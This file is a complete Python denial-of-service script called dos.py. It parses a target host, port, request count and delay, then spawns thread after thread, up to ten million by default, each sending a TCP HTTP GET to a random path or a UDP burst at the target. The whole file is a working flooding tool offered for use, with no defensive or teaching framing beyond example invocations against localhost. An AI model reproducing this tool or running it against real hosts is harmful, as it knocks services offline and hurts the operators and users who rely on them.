#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import argparse
from colorama import Fore
import os
import socket
import threading
import time
import random
import sys
import string

date = time.ctime()
clear = lambda:os.system('cls' if os.name =='nt' else 'clear')

requests_count = 0

yellow = Fore.YELLOW
red = Fore.RED
green = Fore.GREEN
reset = Fore.RESET
random_color = random.choice((green, Fore.BLUE, yellow, red, Fore.CYAN, Fore.WHITE))


def logo():
	clear()
	print(f'''
	{reset}
	   ___       ____
	  / _ \___  / __/
	 / // / _ \_\ \  
	/____/\___/___/  
	                 
''')
def arguments():
	parser = argparse.ArgumentParser(
	description=logo(),
	prog='dos.py',
	usage='./%(prog)s --url [Target IP/URL] -d [DELAY] -r [REQUESTS] --mode [TCP/UDP]',
	formatter_class=argparse.RawDescriptionHelpFormatter,
	epilog=f'''
		{random_color}Examples{reset}

	%(prog)s --url localhost --mode tcp
	%(prog)s --url 127.0.0.1 --mode udp
	%(prog)s --url 0.0.0.0 -r 50000 --mode tcp
'''
	)
	required = parser.add_argument_group(f"{yellow}Required", f"{reset}required options")
	required.add_argument("-u", "--url", help="Target IP/URL", required=True)
	parser.add_argument("-r", "--requests", help="Number of requests", type=int, default=10000000)
	parser.add_argument("-p", "--port", help="Target port", type=int, default=80)
	parser.add_argument("-v", "--verbose", help="Verbose mode", action="count")
	parser.add_argument("-d", "--delay", help="Delay between each request [DEFAULT 0.03]", type=float, default=0.03)
	required.add_argument("--mode", choices=["tcp", "udp"], help="Attack mode")
	args = parser.parse_args()

	try:
		target = args.url.replace("https://", "").replace("http://", "").replace("www.", "")
		args.url = socket.gethostbyname(target)
	except socket.gaierror:
		time.sleep(0.1)
		print(red, '[-] IP/URL not found!', reset)
		sys.exit(2)
	if args.mode == 'udp':
		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #ipv4 / udp
	elif args.mode == 'tcp':
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #ipv4 / tcp
	else:
		print(red, "[-] Select one mode (--mode tcp/udp)!", reset)
		time.sleep(1)
		parser.print_help()
		sys.exit(2)
	return args, s

def data():
	# Path message w/ 8 characters
	# GET /path HTTP/1.1
	word = str(string.ascii_letters + string.digits + string.punctuation)
	m = "".join(random.sample(word, 8))
	return m

def print_status():
	global requests_count
	requests_count += 1
	if args.verbose:
		sys.stdout.write(f"\r {date} {requests_count}/{args.requests}")
		sys.stdout.flush()
	if requests_count == args.requests:
		logo()
		print(f"\n\n{random_color}Finished!\n{reset}")
		sys.exit(0)
def dos():
	args, s = arguments()
	print(green,"\n\n[+] Starting...\n")
	if args.verbose:
		print(yellow, "Target:", args.url)
		print(yellow, "Mode:", args.mode.upper())
		print(yellow, "Delay:", args.delay)
		print_status()
	path = data()
	if args.mode == 'tcp':
		try:
			s.connect((args.url, args.port))
			encoded_data = (f"GET /{path} HTTP/1.1\nHost: {args.url}\n\n").encode()
			s.send(encoded_data)
		except socket.error:
			print(red,"\n\n[!] No connection, maybe down\n\nPress ctrl+c to stop",reset)
			s.close()
	else:
		ip = args.url
		port = args.port
		try:
			s.connect((ip, port))
			s_data = (path * 10).encode()
			s.send(s_data)
			sys.stdout.write(f"\r Sending: {s_data.decode()}")
			sys.stdout.flush()
		except Exception as e:
			print(e)
			s.close()
args, s = arguments()
try:
	all_threads = []
	for i in range(args.requests):
	    t1 = threading.Thread(target=dos)
	    t1.start()
	    all_threads.append(t1)
	    time.sleep(args.delay)
	for t in all_threads:
	    t.join()
except KeyboardInterrupt:
	logo()
	print(f"[{random_color}*{reset}] Exiting...")
	sys.exit(0)
  
